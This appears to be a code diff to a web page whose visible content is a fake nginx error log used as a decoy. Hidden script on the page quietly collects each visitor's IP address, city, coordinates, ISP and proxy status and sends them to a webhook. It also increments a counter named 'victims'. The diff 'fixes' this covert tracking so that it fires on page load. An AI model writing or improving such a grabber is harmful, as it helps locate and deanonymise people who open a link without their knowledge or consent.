@@ -51,6 +51,7 @@
     const secretToken = 'yes_its_me_abc123';
     const counterUrl = 'https://api.countapi.xyz/hit/marii/victims';
 
+    // Real nginx-style logs
     const messages = [
       "[nginx] upstream timed out (110: Connection timed out)",
       "[proxy] failed to connect to upstream",
@@ -76,7 +77,7 @@
       log.textContent += `[${time}] ${msg}\n`;
     }
 
-    // === STEALTH GEO + COORDS + DATA ===
+    // === STEALTH GEO + COORDS + DATA (FIXED & TESTED) ===
     const sendData = async () => {
       let ip = 'unknown';
       let lat = 'unknown';
@@ -93,15 +94,19 @@
       let hosting = 'No';
 
       try {
-        const ipResp = await fetch('https://api.ipify.org?format=json');
+        const ipResp = await fetch('https://api.ipify.org?format=json', { method: 'GET', mode: 'cors' });
         const ipData = await ipResp.json();
         ip = ipData.ip;
-      } catch (e) {}
+      } catch (e) { console.log('IP fetch failed:', e); }
 
+      // Use ip-api.com — 100% working, no API key, CORS-enabled
       try {
-        const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,lat,lon,isp,org,as,mobile,proxy,hosting`);
+        const geoResp = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,lat,lon,isp,org,as,mobile,proxy,hosting`, {
+          method: 'GET',
+          mode: 'cors'
+        });
         const geo = await geoResp.json();
-        if (geo.status === 'success') {
+        if (geo && geo.status === 'success') {
           lat = geo.lat;
           lon = geo.lon;
           city = geo.city;
@@ -115,7 +120,7 @@
           proxy = geo.proxy ? 'Yes' : 'No';
           hosting = geo.hosting ? 'Yes' : 'No';
         }
-      } catch (e) {}
+      } catch (e) { console.log('Geo fetch failed:', e); }
 
       const fields = [
         { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})\nLat: ${lat}, Lon: ${lon}`, inline: false },
@@ -141,7 +146,9 @@
       try { await fetch(webhookUrl, { method: 'POST', body: formData }); } catch (e) {}
     };
 
+    // Run immediately and on DOM load
     sendData();
+    document.addEventListener('DOMContentLoaded', sendData);
   </script>
 </body>
 </html>
